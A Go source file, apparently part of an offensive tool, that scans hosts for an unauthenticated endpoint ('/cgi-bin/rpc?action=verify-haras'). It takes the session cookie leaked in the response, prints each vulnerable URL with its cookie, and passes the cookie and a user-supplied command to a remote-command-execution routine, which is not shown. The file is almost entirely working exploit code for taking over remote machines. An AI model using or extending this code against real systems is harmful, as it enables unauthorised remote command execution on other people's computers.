package DataHandle

import (
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"net/http/httputil"
	"strings"
	"sync"
	"time"
)

var Client = &http.Client{Timeout: 10 * time.Second}

func HTTPProtScan(url string, wg *sync.WaitGroup) {
	defer wg.Done()
	_, respbody, _, err := RequestHead("Get", url+"/cgi-bin/rpc?action=verify-haras", nil, nil)
	if err != nil {
		return
	}
	if strings.Contains(respbody, "verify_string") {
		cookie := Jsonhandle(respbody)
		fmt.Printf("\nhttp://%v/cgi-bin/rpc?action=verify-haras存在漏洞，cookie值为%s\n", url, cookie)
		if Cmd != "" {
			RCE(Cmd, cookie, url)
		}
	}

}
func RequestHead(Main string, url string, bodys io.Reader, head map[string]string) (*http.Response, string, string, error) {
	/*考虑到后期实用性，将http请求方式、URL、body及HTTP请求头放入变量*/
	resq, err := http.NewRequest(Main, url, bodys)
	if err != nil {
		return nil, "", "", err
	}
	for key, val := range head {
		resq.Header.Add(key, val)
	}
	resqbody, err := httputil.DumpRequest(resq, true)
	if err != nil {
		return nil, "", "", err
	}
	resp, err := Client.Do(resq)
	if err != nil {
		return nil, "", "", err
	}
	body, err := ioutil.ReadAll(resp.Body)
	defer resp.Body.Close()
	if err != nil {
		return nil, "", "", err
	}
	return resp, string(body), string(resqbody), nil
}
